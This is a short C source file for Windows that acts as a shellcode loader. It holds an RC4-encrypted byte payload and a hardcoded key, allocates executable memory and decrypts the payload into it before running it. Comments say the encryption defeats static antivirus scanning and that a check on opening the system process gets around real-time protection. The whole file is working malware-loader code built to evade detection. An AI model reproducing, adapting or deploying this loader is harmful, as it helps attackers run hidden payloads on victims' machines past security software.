#include <Windows.h>
#include <rc4.h>

// The encrypted code allows us to get around static scanning
unsigned char buf[] = 
"\x67\xc6\xe9\xe7\x07\x0a\x37\x3b\x63\xf0\xfd\x02\xc3\x23\xcd"
"\xca\x5d\x83\x1d\x37\xaa\x52\x45\xb7\x97\xf8\x05\x39\xb9\x55"
"\x80\x16\x3d\x55\x80\x5a\xd9\xcb\x25\x7d\xd8\x82\x27\x42\xc7"
"\x72\x31\x36\x26\x78\xcf\xf8\xf1\x29\x44\xc4\x10\xb0\x19\x58"
"\x3f\x16\x55\xd6\x8e\xaf\xf7\x56\x3f\xf9\x88\x25\x6e\x39\x70"
"\xdc\x63\x48\x88\xfa\x89\xee\xe7\x9a\xb6\xf9\x70\x66\x4e\x3f"
"\x73\x19\xbd\xdd\xb5\xb6\x7f\x27\x54\x95\xe8\x1d\x0c\xb4\x53"
"\x81\x29\x08\x3c\x27\xdf\x5f\x41\x8a\xab\xf8\x77\xee\x6e\x1e"
"\x2f\x23\xb6\xe3\x44\xb0\xe3\xbf\xc0\x97\xae\xd1\xdf\x47\x65"
"\x98\x54\xd4\x91\x57\x21\x3e\x84\x46\x07\xa4\xd4\x95\x5e\x22"
"\xff\x62\xcc\xdc\x2e\x35\xc9\xf4\xa0\x6c\x3a\x63\xcb\xf7\x1d"
"\x27\xe3\x31\x9b\xd2\x9e\x7b\xf6\x59\xd5\x84\xc4\xa8\x2d\x74"
"\xea\x81\x72\x1c\x2c\x00\xf5\x3c\x7f\xb3\x36\x5e\x68\xbd\xb0"
"\x93\xe0\xbf\x3e\x34\x21\x00\x45\x98\x30\xf2\x92\x61\x10\xbf"
"\xa8\x37\x2c\x07\x51\x23\x7a\x0a\xac\x7b\x15\xe1\xa0\x76\x5a"
"\x9d\x69\xf4\x0b\x5e\xa0\x56\xcd\x98\x30\xe2\x6c\xac\xc2\xe8"
"\x16\xfa\x36\xfd\x15\x9c\x66\xc8\x7b\x7f\xa7\x28\xa5\x30\x6d"
"\x01\xc3\xea\x0e\x53\xd9\x56\xdf\x32\x61\x86\xa8\x99\x11\xec"
"\x23\x33\x33\x23\x0d\x06\x44\x6c\x84\xec\x7b\x8b\x34\xa9\xad"
"\x24\x1f\x6c\xa8\xfd\xc0\x5f\xec\xdb\xac\xf4\x7c\x60\x93\x39"
"\x74\x43\x2c\xef\x7c\x4e\xa0\xed\xf3\x9f\xb5\x93\x0c\xac\x69"
"\xd3\x3b\x6b\x4e\x66\x68\x2d\x6f\x09\x99\x12\x17\xf6\x92\x3b"
"\x19\x4c\x9a\xdb\x52\x81\x21\x2a\xd7\x26\xa4\x3a\x38\x9c\x7d"
"\xe1\x55\x03\x52\x3b\x78\xd6\x5e\x75\x7c\xfd\x80\x06\xfd\x5b"
"\xe1\x70\xd8\xdd\x3a\x68\x21\xd6\x92\xf5\xfe\xae\x85\xf7\x93"
"\x5c\xcf\x51\x82\x2a\x1f\xf4\xf3\x8d\x60\xdf\x62\xbc\xe2\xb3"
"\xcf\xa3\x41\xd0\x48\x17\x0c\x86\x99\xf6\x9f\xfb\xac\x7d\xa4"
"\x9e\x6e\x46\xc6\xc0\x7d\xd4\x9f\x5f\x8e\x34\xf9\x1a\xa2\x45"
"\xb4\x9e\x70\x84\x76\x50\x07\xc3\xee\x93\x75\xce\xff\xe7\xbc"
"\x17\x4d\x87\xe1\xcd\x3c\x3d\xab\x78\x4a\x9b\xb2\x40\x48\x84"
"\x59\x7f\xab\xf4\x7d\xf0\x37\xf1\x50\x18\x1f\x73\x1f\x79\x25"
"\xb1\x70\xa9\x49\xc6\x6d\xe5\x0f\x8e\xe1\x3c\x39\x20\x01\xa1"
"\x42\x09\x2d\x81\xb3\xfc\x5e\x79\xf5\xab\x91\x4a\xa3\x2f\x98"
"\xc8\x6b\x0e\xbf\x32\xed\xa9\xf8\x67\x6a\x10\xb3\xdb\xd6\xb5"
"\xf0\x57\x82\x72\x23\x4b\x80\x08\xff\xc7\x40\x75\xda\xcd\x6b"
"\xc0\xe0\x7c\x8c\xfd\x0b\xb6\xfe\x00\xa6\x2d\x88\xe7\xc9\xeb"
"\x3f\x6e\x34\xe7\x63\x47\x61\xdb\xec\x57\x5d\x9a\x0a\xb6\x14"
"\x06\x83\x5c\x2c\x1a\xd4\x3c\xd0\xbb\xe8\xcd\xab\x2d\xdf\x4d"
"\x36\x8c\xfd\xb7\x09\xc8\xf1\x75\x4e\xf9\x35\xb2\x68\xcd\xf5"
"\xe2\xcf\x61\x80\xda\xa8\x98\x98\xa4\x2b\x2b\xe2\x75\x0f\x21"
"\x67\x15\x5b\x33\x35\xbe\x5a\x5a\x9f\x86\xcc\x1f\xb8\xea\xf0"
"\xa1\x70\x4c\x51\x5d\x24\xa1\xb6\x08\xb7\x3c\x71\xf4\x3b\x3c"
"\xb5\x50\x80\xbc\x8b\x3c\x65\xd8\x90\xff\xf0\x28\xf5\xce\xe8"
"\x8c\x73\xd6\x55\x5f\xbe\x24\xa9\xdd\x57\x17\x41\x83\x5e\x97"
"\x7d\x40\xda\xbd\x9b\xb4\x28\x28\x81\x39\x15\x74\x66\xe5\xd1"
"\x6e\x7d\x20\xa3\xe3\x87\x4b\x10\xbe\x9a\xbe\x49\x15\x60\x06"
"\xf3\xbe\x80\x69\x18\x24\xb3\xf9\x96\x3e";


int main() {
  int lpBufSize = sizeof(int) * 700;
  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
  memset(lpBuf, '\0', lpBufSize);

  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
  // Checking NULL allows us to get around Real-time protection
  if (proc == NULL) {
    RC4("vXJDRPBUBnXKFphOMNzDZTCjnpbYhYDIMPBoYGotFWsBegm", buf, (char*) lpBuf, 700);
    void (*func)();
    func = (void (*)()) lpBuf;
    (void)(*func)();
  }

  return 0;
}
